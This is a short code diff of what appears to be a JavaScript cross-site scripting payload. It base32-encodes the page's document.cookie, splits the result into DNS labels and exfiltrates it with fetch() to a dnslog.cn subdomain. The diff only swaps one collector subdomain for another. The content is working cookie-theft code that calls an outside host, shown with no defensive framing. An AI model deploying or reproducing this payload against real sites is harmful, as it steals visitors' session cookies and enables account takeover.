@@ -3,4 +3,4 @@ function lc(str, num) {let strArr = [];for (let i = 0; i < str.length; i += num)
 let t = lc(encodeBase32(document.cookie),20);
 let ans = '';
 for (let i = 0; i < t.length; i += 1)ans += t[i] + '.';
-fetch('https://' + ans + 'mrfhak.dnslog.cn');
+fetch('https://' + ans + 'g9xx1q.dnslog.cn');
